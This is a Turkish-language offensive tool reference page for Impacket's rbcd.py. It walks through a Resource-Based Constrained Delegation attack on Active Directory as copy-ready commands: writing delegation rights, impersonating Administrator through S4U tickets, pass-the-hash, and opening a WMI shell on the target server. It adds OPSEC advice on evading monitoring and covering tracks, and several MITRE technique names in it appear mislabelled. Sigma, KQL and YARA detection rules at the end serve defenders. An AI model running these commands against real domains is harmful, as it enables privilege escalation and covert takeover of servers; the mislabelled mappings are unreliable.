# impacket-rbcd

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Elad Shamir (@elad_shamir) tarafından keşfedilen Kaynak Tabanlı Kısıtlı Yetki Devri (RBCD - Resource-Based Constrained Delegation) saldırısını otomatikleştiren; hedef bilgisayar hesabı üzerinde yazma iznine sahip olunduğunda hedef nesnenin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine saldırgan kontrolündeki bir makinenin güvenlik tanımlayıcısını (DACL) yazan, okuyan ve temizleyen Impacket/Python aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında Kerberos yetki devri (Delegation), bir servisin arka plandaki başka bir servise (örneğin bir web sunucusunun veritabanı sunucusuna) kullanıcı adına erişebilmesini sağlar. Geleneksel kısıtlı yetki devrinde (Constrained Delegation), yetkiyi veren makineyi yalnızca etki alanı yöneticileri (Domain Admins) belirleyebilir (`msDS-AllowedToDelegateTo` özniteliği).

Ancak Microsoft, Windows Server 2012 ile birlikte yetki yönetimini kaynak sunucunun yerel yöneticilerine devretmek amacıyla **Kaynak Tabanlı Kısıtlı Yetki Devrini (RBCD)** tanıtmıştır. RBCD mekanizmasında kimin yetki devredeceğine hedef sunucunun kendisi karar verir. Bu yapılandırma, hedef bilgisayar nesnesinin **`msDS-AllowedToActOnBehalfOfOtherIdentity`** özniteliğinde bir ikili Güvenlik Tanımlayıcısı (Security Descriptor / DACL) olarak saklanır.

2019 yılında Elad Shamir tarafından yayımlanan *"Wagging the Dog: Abusing Resource-Based Constrained Delegation"* araştırması, bir saldırganın hedef bilgisayar hesabı üzerinde yazma yetkisi (`GenericWrite`, `GenericAll`, `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` veya nesne sahipliği) elde ettiğinde, bu özniteliği manipüle ederek hedef sistem üzerinde Domain Admin dahil herhangi bir kullanıcıyı taklit edebileceğini kanıtlamıştır.

**`impacket-rbcd` (rbcd.py)**, bu sömürüyü Linux terminalinden saf LDAP/LDAPS protokolü üzerinden yürüten resmi Impacket aracıdır. Saldırganın kontrolündeki bir bilgisayar hesabının SID değerini hedef bilgisayarın güvenlik tanımlayıcısına enjekte eder (`-action write`), mevcut delegasyonları sorgular (`-action read`) veya operasyon bittiğinde bu kaydı kaldırarak (`-action remove` / `-action flush`) hedefi temizler.

### RBCD Sömürü Zinciri (The RBCD Attack Chain)

1. **Hedef Tespiti:** BloodHound üzerinde hedef sunucu (`FILESRV01$`) üzerinde `GenericWrite` yetkisi tespit edilir.
2. **Aracı Makine Edinme:** Standart kullanıcı kotası (MAQ) kullanılarak `PowerMad` veya `impacket-addcomputer` ile etki alanına sahte bir bilgisayar hesabı (`EVILPC$`) eklenir. (Standart kullanıcılar SPN sahibi olamaz, bilgisayar hesapları otomatik SPN alır).
3. **RBCD Yetkisinin Yazılması (impacket-rbcd):** `rbcd.py` çalıştırılarak `FILESRV01$` nesnesinin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine `EVILPC$` hesabının SID'si yazılır.
4. **S4U2self ile İstemci Bileti Alma:** `getST.py` aracıyla `EVILPC$` adına KDC'ye S4U2self isteği gönderilir ve `Administrator` adına servis bileti talep edilir.
5. **S4U2proxy ile Hedef Servis Bileti Türetme:** Alınan bilet KDC'ye sunularak `cifs/FILESRV01.corp.local` servisi için `Administrator` adına tam yetkili bir TGS bileti türetilir.
6. **Pass-the-Ticket ile Yanal Hareket:** Elde edilen TGS bileti ile dosya sunucusuna bağlanılır ve tam yerel yönetici (`SYSTEM`) olunur.
7. **İz Temizliği:** `rbcd.py -action remove` ile enjekte edilen delegasyon silinir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU (IMPACKET)                 │
│                                                                        │
│  [ rbcd.py -delegate-to FILESRV01$ -delegate-from EVILPC$             │
│            -action write -dc-ip 10.10.10.1 -u jdoe -p Pass123 ]        │
│         │                                                              │
│         ├── (1) LDAP / LDAPS Bağlantısı Açılır (TCP 389/636)           │
│         │   └── FILESRV01$ ve EVILPC$ Nesnelerinin SID'leri Çözülür    │
│         │                                                              │
│         ├── (2) Security Descriptor İkili Yapısı Oluşturulur           │
│         │   └── ACE: Principal = EVILPC$_SID, Access = Execute/ActAs   │
│         │                                                              │
│         ├── (3) LDAP Modify Çağrısı Gönderilir:                        │
│         │   └── msDS-AllowedToActOnBehalfOfOtherIdentity = [SD_BLOB]   │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (NTDS.DIT) ] ──► Delegasyon Özniteliği Yazıldı    │
│         │                                                              │
│  [ impacket-getST -spn cifs/filesrv01.corp.local                      │
│                   -impersonate Administrator corp.local/EVILPC$:Pass ] │
│         │                                                              │
│         ├── (4) S4U2self: EVILPC$ -> Administrator TGS (Kendi Adına)   │
│         ├── (5) S4U2proxy: Administrator -> cifs/filesrv01 (Hedefe)    │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: Administrator@cifs/filesrv01.ccache Bileti Alındı! ]         │
│         │                                                              │
│         └── (6) İz Temizliği: rbcd.py ... -action remove               │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Klasik Parola Sıfırlama | RBCD Saldırısı (impacket-rbcd) |
|---|---|---|
| **Kullanıcı/Makine Etkisi** | Parola değiştiğinde servisler çöker ve kullanıcı kilitlenir. | Hedef sunucunun mevcut parolasını veya servisini asla etkilemez. |
| **Gereken Yetki Düzeyi** | Doğrudan yerel yönetici veya Domain Admin olmak gerekir. | Standart bir kullanıcı hesabının makinede `GenericWrite` izni olması yeterlidir. |
| **Kalıcılık ve Gizlilik** | Parola sıfırlama anında SIEM alarmı üretir (Event 4724). | Delegasyon sessizce işletilir ve TGS alındıktan sonra hemen geri silinir. |
| **Protokol Bağımsızlığı** | Hedef makinenin açık portlarına bağımlıdır. | Yalnızca Domain Controller ile haberleşir (LDAP ve Kerberos). |

### Alternatif Araçlarla Karşılaştırma

| Özellik | impacket-rbcd | bloodyAD (add rbcd) | StandIn | PowerView (Set-DomainObject) |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 (Impacket) | Python 3 | C# (.NET) | PowerShell |
| **Platform** | Linux / macOS / Windows | Linux / macOS / Windows | Windows (Yerel) | Windows (PowerShell) |
| **Delegasyon İnceleme** | 🟢 Yerleşik (`-action read`)| 🟡 Salt öznitelik okur | 🟢 Var | 🔴 Manuel SD ayrıştırma |
| **Tekil Silme (Remove)** | 🟢 Var (`-action remove`) | 🟢 Var (`remove rbcd`) | 🟢 Var | 🔴 Karmaşık SD manipülasyonu |
| **Tam Temizleme (Flush)** | 🟢 Var (`-action flush`) | 🔴 Yok | 🔴 Yok | 🔴 Yok |
| **Pass-the-Hash Desteği** | 🟢 Yerleşik (`-hashes`) | 🟢 Yerleşik (`--hashes`)| 🔴 Yok | 🔴 Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

impacket-rbcd, hedef makineyi, yetki devredilecek makineyi ve gerçekleştirilecek eylemi parametre olarak alır.

### Genel Sözdizimi

```bash
python3 rbcd.py -delegate-to <HEDEF_MAKİNE> -delegate-from <ARACI_MAKİNE> -action <EYLEM> -dc-ip <DC_IP> [Kimlik Parametreleri]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-delegate-to HEDEF` | Üzerinde yazma yetkisi bulunan hedef bilgisayar hesabı (`sAMAccountName` formatında). | `-delegate-to FILESRV01$` |
| `-delegate-from ARACI` | Hedef makineye delegasyon yetkisi verilecek kontrolümüzdeki bilgisayar hesabı. | `-delegate-from EVILPC$` |
| `-delegate-from-sid SID` | Aracı makine adı yerine doğrudan onun nesne SID değerini belirterek yazma. | `-delegate-from-sid S-1-5-21-...-1105` |
| `-action EYLEM` | Yürütülecek operasyon: `write` (ekle), `read` (oku), `remove` (tekil sil), `flush` (tümünü sil). | `-action write` |
| `-dc-ip IP` | Hedef Etki Alanı Denetleyicisinin IP adresi. | `-dc-ip 10.10.10.1` |
| `-use-ldaps` | Düz metin LDAP (389) yerine SSL/TLS şifreli LDAPS (636) bağlantısını zorunlu kılar. | `-use-ldaps` |
| `-hashes LM:NT` | Parola yerine NTLM parola karması ile Pass-the-Hash kimlik doğrulaması. | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-k` | Parola yerine Kerberos bilet önbelleğini (`KRB5CCNAME`) kullanır. | `-k -no-pass` |
| `-no-pass` | Parola sorma işlemini atlar. | `-no-pass` |
| `-target-domain DOMAIN` | Hedef bilgisayarın bulunduğu etki alanı adı. | `-target-domain corp.local` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Hedef Sunucuya RBCD Delegasyon Hakkı Yazma

Saldırganın kontrolündeki `ATTACKPC$` bilgisayar hesabına, hedef dosya sunucusu `FILESRV01$` üzerinde yetki devretme hakkı tanımlamak:

```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -u jdoe -p 'Welcome2026!' -target-domain corp.local
```

**Örnek Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Connecting to LDAP server 10.10.10.1...
[+] Successfully bound to LDAP server!
[*] Querying target machine 'FILESRV01$'...
[+] Found target object: CN=FILESRV01,OU=Servers,DC=corp,DC=local
[*] Querying delegate machine 'ATTACKPC$'...
[+] Found delegate object: CN=ATTACKPC,CN=Computers,DC=corp,DC=local
[*] Delegate SID: S-1-5-21-3921021948-1209384729-1928374621-1105

[*] Reading current security descriptor of 'msDS-AllowedToActOnBehalfOfOtherIdentity'...
[*] Target has no existing allowed principals. Creating new Security Descriptor...
[*] Adding Access Allowed ACE for SID 'S-1-5-21-3921021948-1209384729-1928374621-1105'...
[*] Writing updated Security Descriptor to LDAP...
[+] Successfully wrote msDS-AllowedToActOnBehalfOfOtherIdentity on 'FILESRV01$'!
[*] 'ATTACKPC$' can now impersonate users to 'FILESRV01$' via S4U2proxy.
```

*Çıktı Yorumu:* `ATTACKPC$` makinesinin SID değeri `FILESRV01$` nesnesinin delegasyon alanına başarıyla eklenmiştir.

### Senaryo 2: Hedef Sunucudaki Mevcut Delegasyon İzinlerini Sorgulama

Hedef makinede önceden tanımlanmış herhangi bir RBCD yetkisi olup olmadığını incelemek:

```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -action read -dc-ip 10.10.10.1 -u jdoe -p 'Welcome2026!' -target-domain corp.local
```

**Örnek Konsol Çıktısı:**

```text
[*] Querying target machine 'FILESRV01$'...
[+] msDS-AllowedToActOnBehalfOfOtherIdentity Security Descriptor:
    DACL Principals Allowed to Impersonate:
      - SID: S-1-5-21-3921021948-1209384729-1928374621-1105 (CORP\ATTACKPC$)
```

### Senaryo 3: S4U2self ve S4U2proxy ile Domain Admin Adına Servis Bileti Alma

RBCD hakkı yazıldıktan sonra, `ATTACKPC$` hesabı ve parolası kullanılarak KDC'den `Administrator` adına CIFS servis bileti talep etmek:

```bash
impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator -dc-ip 10.10.10.1 'corp.local/ATTACKPC$:SecretMachinePass123!'
```

Bu komut başarıyla tamamlandığında yerel dizine `Administrator@cifs_filesrv01.corp.local@CORP.LOCAL.ccache` bilet dosyası yazılır.

### Senaryo 4: Alınan Bilet ile Uzak Sunucuda WMI / SMB Oturumu Başlatma

Üretilen bileti ortam değişkenine aktararak hedef dosya sunucusunda parola sormadan tam yetkili komut kabuğu açmak:

```bash
export KRB5CCNAME=Administrator@cifs_filesrv01.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.10.10.1 'CORP.LOCAL/Administrator@filesrv01.corp.local'
```

### Senaryo 5: Operasyon Sonrası İz Temizliği (Tekil Delegasyon Silme)

Sızma testi tamamlandıktan sonra eklenen aracı bilgisayarın yetkisini güvenle geri almak:

```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action remove -dc-ip 10.10.10.1 -u jdoe -p 'Welcome2026!' -target-domain corp.local
```

### Senaryo 6: Pass-the-Hash ile RBCD Yapılandırması

Parola bilinmediğinde ele geçirilen NTLM hash ile yetki devri hakkı yazmak:

```bash
python3 rbcd.py -delegate-to 'SQLSRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -u svc_admin -hashes :7a1029384bfe2109384729102834bfa1 -target-domain corp.local
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `LDAPInsufficientAccessRightsResult: 0x32 (INSUFFICIENT_ACCESS_RIGHTS)` | Kimlik doğrulayan kullanıcının hedef bilgisayar nesnesi üzerinde `GenericWrite`, `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` veya `GenericAll` izni yoktur. | BloodHound grafiğinde nesne izinleri tekrar incelenmeli; yazma hakkı olan doğru hesap kullanılmalı veya önce nesne sahipliği (`WriteOwner`) ele geçirilmelidir. |
| `KerberosSessionError: KDC_ERR_BADOPTION (13) during getST` | `getST.py` aşamasında aracı bilgisayar hesabının Kerberos ön kimlik doğrulama anahtarları (AES/RC4) KDC ile uyuşmamaktadır. | Makine hesabı yeni oluşturulduysa parolasının doğru yazıldığından emin olunmalı veya `-hashes` yerine açık parola denenmelidir. |
| `KerberosSessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN (7)` | `-spn` parametresinde belirtilen servis adı (Örn: `cifs/filesrv01.corp.local`) etki alanında tanımlı değildir veya FQDN yerine geçersiz NetBIOS adı yazılmıştır. | Hedef makinenin tam FQDN adı ve SPN'i `setspn -L <Makine>` veya LDAP sorgusu ile doğrulanmalıdır. |
| `KerberosSessionError: KDC_ERR_POLICY / Account is sensitive and cannot be delegated` | Taklit edilmek istenen kullanıcı (`Administrator`), "Hesap hassastır ve devredilemez" (NOT_DELEGATED) bayrağına sahiptir veya `Protected Users` grubunun üyesidir. | `Protected Users` grubu üyeleri S4U yetki devri ile taklit edilemez. Korunmayan başka bir Domain Admin veya hedef sunucuda yerel yönetici olan bir grup/kullanıcı taklit edilmelidir. |
| `KerberosSessionError: KRB_AP_ERR_SKEW (37)` | Linux saldırgan makinesinin saati ile hedef DC saati arasında 5 dakikadan fazla fark vardır. | Saat senkronize edilmelidir: `sudo ntpdate 10.10.10.1` veya `sudo rdate -n 10.10.10.1`. |
| `Target has existing SD that cannot be parsed` | Hedef nesnedeki mevcut güvenlik tanımlayıcısı bozuk veya desteklenmeyen özel bir yapıdadır. | Gerekirse `-action flush` ile mevcut öznitelik tamamen temizlenip sıfırdan yazılabilir (Dikkat: Eski meşru delegasyonları da siler). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟢 MİNİMAL (Yalnızca LDAP TCP 389/636 & KDC 88) │
│  [ DC Dizin Günlüğü ]: 🔴 YÜKSEK (Event 5136 msDS-AllowedToActOn...)   │
│  [ Kerberos Günlüğü ]: 🔴 YÜKSEK (Event 4769 S4U2self / S4U2proxy)     │
│  [ Uç Nokta İzi ]    : 🟢 SIFIR (Hedef sunucuya doğrudan temas yok)   │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Değişiklik Günlükleri (Security Log):**
   - **Event ID 5136 (Directory Service Object Modified):**
     - `ObjectDN: CN=FILESRV01,OU=Servers,DC=corp,DC=local`
     - `AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity`
     - `OperationType: Value Added` (Saldırı anı) ve `Value Deleted` (Temizlik anı).
     - Bu olay, değişikliği yapan kullanıcının kimliğini (`SubjectUserName`) açıkça kaydeder.
2. **Domain Controller Kerberos Günlükleri:**
   - **Event ID 4769 (A Kerberos service ticket was requested):**
     - S4U2self isteğinde `ServiceName` olarak aracı makinenin kendi adı görünür.
     - S4U2proxy isteğinde `Ticket Options: 0x40800000` (Forwardable, Constrained Delegation) bayrağı yer alır.
     - Aracı makinenin normalde o sunucuya bağlanması beklenmeyen bir bilgisayar hesabı olması şüphe uyandırır.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Paket İmzası:** Dizin sunucusuna gönderilen `modifyRequest` paketinde `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliği içinde ikili Security Descriptor bulunması.
- **Zaman Korelasyonu:** LDAP yazma işleminin hemen ardından aynı aracı makineden gelen S4U2self ve S4U2proxy Kerberos talepleri.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1558.002** | Kerberos Ticket Granting Service (TGS): S4U Abuse | S4U2self ve S4U2proxy yetki devri protokollerinin suistimali. |
| **T1484.001** | Domain Policy Modification | Hedef bilgisayarın delegasyon özniteliğinin değiştirilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Taklit edilen meşru yönetici biletleriyle oturum açılması. |
| **T1098** | Account Manipulation | Bilgisayar nesnesi güvenlik tanımlayıcısının manipülasyonu. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kalıcı Delegasyon İzi** | TGS bileti alındıktan sonra asla hedef nesne kirli bırakılmamalıdır; `rbcd.py -action remove` ile eklenen ACE anında silinmelidir. |
| **Protected Users Koruması** | Hedef yönetici `Protected Users` grubundaysa S4U isteği KDC tarafından reddedilir ve alarm üretir. Önceden kullanıcının grup üyeliğini kontrol edin. |
| **Düz Metin LDAP İzlenmesi** | Ağ izleme sistemlerinden kaçınmak için her zaman `-use-ldaps` (Port 636) bayrağını kullanın. |
| **Aracı Makine İsimlendirmesi** | `ATTACKPC$`, `RBCD$` gibi dikkat çekici isimler yerine `IT-PRINT-02$` veya `DESKTOP-9812A$` gibi kurumsal isimlendirme standartlarını taklit edin. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: msDS-AllowedToActOnBehalfOfOtherIdentity Öznitelik Değişikliği Tespiti

```yaml
title: RBCD msDS-AllowedToActOnBehalfOfOtherIdentity Modification
id: f91238a1-4912-4c20-a912-48910245fe01
status: experimental
description: Detects modification of the msDS-AllowedToActOnBehalfOfOtherIdentity attribute indicative of Resource-Based Constrained Delegation abuse.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  condition: selection
falsepositives:
  - Legitimate server administration configuring cross-forest or multi-tier server delegation
level: high
tags:
  - attack.privilege_escalation
  - attack.t1558.002
  - attack.t1484.001
```

#### Microsoft Sentinel KQL Sorgusu: RBCD Değişikliği ve S4U Bilet Talebi Korelasyonu

```kql
// 10 dakika içinde msDS-AllowedToActOnBehalfOfOtherIdentity değiştirilip ardından S4U bileti istenmesi
let RbcdMod = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5136 and AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project ModTime = TimeGenerated, SubjectUserName, TargetComputer = tostring(parse_xml(EventData).EventData.Data[4]);
let S4uTickets = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4769
| extend TicketOptions = tostring(parse_xml(EventData).EventData.Data[4])
| where TicketOptions has "0x40800000" or TicketOptions has "0x40810000"
| project TicketTime = TimeGenerated, TargetUserName, ServiceName, IpAddress;
RbcdMod
| join kind=inner (S4uTickets) on $left.SubjectUserName == $right.TargetUserName
| where TicketTime between (ModTime .. (ModTime + 10m))
| project ModTime, TicketTime, SubjectUserName, TargetComputer, ServiceName, IpAddress
```

#### YARA Kuralı: Impacket rbcd.py Script ve İmzaları

```yara
rule PostExploit_Impacket_RBCD_Tool {
    meta:
        description = "Detects Impacket rbcd.py Resource-Based Constrained Delegation tool"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "msDS-AllowedToActOnBehalfOfOtherIdentity" ascii
        $s2 = "-delegate-to" ascii
        $s3 = "-delegate-from" ascii
        $s4 = "rbcd.py" ascii
        $s5 = "impacket.ldap" ascii
    condition:
        all of ($s1, $s2, $s3) or (all of ($s1, $s4, $s5))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Hedef Makineye Delegasyon Yetkisi Yazma
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local
```
- **Ne Yapar?** `FILESRV01$` nesnesinin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine `ATTACKPC$` makinesini ekler.
- **Ne Zaman Kullanılır?** Hedef makinede yazma yetkisi olduğunda RBCD sömürüsünü başlatmak için.
- **Parametreler:** `-delegate-to`: Hedef sunucu, `-delegate-from`: Aracı makine, `-action write`: Yazma modu.

### Komut 2: Hedef Makinedeki Mevcut Delegasyonları Okuma
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -action read -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local
```
- **Ne Yapar?** Hedef bilgisayara kimlerin yetki devretme hakkı olduğunu listeler.
- **Ne Zaman Kullanılır?** Önceden tanımlı delegasyonları veya eklenen kaydın doğruluğunu kontrol etmek için.
- **Parametreler:** `-action read`: Okuma modu.

### Komut 3: Eklenen Delegasyonu Güvenle Silme (OPSEC Temizliği)
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action remove -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local
```
- **Ne Yapar?** Yalnızca belirtilen `ATTACKPC$` makinesinin delegasyon hakkını siler; varsa diğer meşru izinleri korur.
- **Ne Zaman Kullanılır?** S4U biletleri alındıktan hemen sonra nesneyi temizlemek için.
- **Parametreler:** `-action remove`: Tekil kaldırma modu.

### Komut 4: Tüm Delegasyonları Sıfırlama (Flush)
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -action flush -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local
```
- **Ne Yapar?** Hedef makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini tamamen temizler (NULL yapar).
- **Ne Zaman Kullanılır?** Eski delegasyon kayıtları bozulduğunda veya tüm izinleri sıfırlamak gerektiğinde.
- **Parametreler:** `-action flush`: Tam temizleme.

### Komut 5: Pass-the-Hash ile RBCD Yapılandırma
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -u svc_admin -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -target-domain corp.local
```
- **Ne Yapar?** Açık parola yerine NTLM hash kullanarak kimlik doğrular ve delegasyon hakkını yazar.
- **Ne Zaman Kullanılır?** Yalnızca parola karması ele geçirildiğinde.
- **Parametreler:** `-hashes`: LM:NT parola karması formatı.

### Komut 6: Doğrudan SID Değeri ile Yetki Verme
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from-sid 'S-1-5-21-3921021948-1209384729-1928374621-1105' -action write -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local
```
- **Ne Yapar?** Aracı makinenin adını çözmeden doğrudan bilinen nesne SID değeriyle delegasyonu yazar.
- **Ne Zaman Kullanılır?** LDAP aramasının kısıtlı olduğu veya çapraz etki alanı (Cross-Domain) senaryolarında.
- **Parametreler:** `-delegate-from-sid`: Aracı nesnenin ham SID değeri.

### Komut 7: Şifreli LDAPS Bağlantısı Zorlama
```bash
python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -u jdoe -p 'Pass123' -target-domain corp.local -use-ldaps
```
- **Ne Yapar?** LDAP işlemlerini TCP 636 üzerinden TLS şifreli olarak yürütür.
- **Ne Zaman Kullanılır?** LDAP imzalama zorunluluğunu aşmak ve ağ analizinden gizlenmek için.
- **Parametreler:** `-use-ldaps`: Güvenli soket bağlantısı.

### Komut 8: Kerberos Bileti ile Parolasız Çalıştırma
```bash
export KRB5CCNAME=/tmp/jdoe.ccache && python3 rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'ATTACKPC$' -action write -dc-ip 10.10.10.1 -k -no-pass -target-domain corp.local
```
- **Ne Yapar?** Önceden elde edilmiş bir TGT biletini kullanarak parola girmeden delegasyonu yazar.
- **Ne Zaman Kullanılır?** Parola izi bırakmamak ve Kerberos ortamlarında çalışmak için.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 9: S4U2self ve S4U2proxy ile Bilet Alma (getST Zinciri)
```bash
impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator -dc-ip 10.10.10.1 'corp.local/ATTACKPC$:MachinePass123!'
```
- **Ne Yapar?** `ATTACKPC$` hesabı ile Administrator adına CIFS servis bileti türetir.
- **Ne Zaman Kullanılır?** `rbcd.py -action write` başarılı olduktan hemen sonra TGS bileti almak için.
- **Parametreler:** `-spn`: Hedef servis, `-impersonate`: Taklit edilecek kullanıcı.

### Komut 10: Türetilen Bilet ile WMI Oturumu Başlatma
```bash
export KRB5CCNAME=Administrator.ccache && impacket-wmiexec -k -no-pass 'CORP.LOCAL/Administrator@filesrv01.corp.local'
```
- **Ne Yapar?** Alınan Kerberos biletini kullanarak hedef sunucuda tam yetkili WMI komut kabuğu açar.
- **Ne Zaman Kullanılır?** RBCD sömürüsünü tamamlayıp sunucuyu tam kontrol altına almak için.
- **Parametreler:** `-k`: Kerberos kimlik doğrulaması.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket (rbcd.py)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- **Elad Shamir Araştırması:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://eladshamir.com/2019/01/28/wagging-the-dog/)
- **Microsoft Dokümantasyonu:** [msDS-AllowedToActOnBehalfOfOtherIdentity attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- **MITRE ATT&CK Referansı:** [T1558.002 - Kerberos Ticket Granting Service (TGS): S4U Abuse](https://attack.mitre.org/techniques/T1558/002/)

---

> **Önceki:** [← PowerMad](./PowerMad.md) · **Sonraki:** [impacket-addcomputer →](./impacket-addcomputer.md)
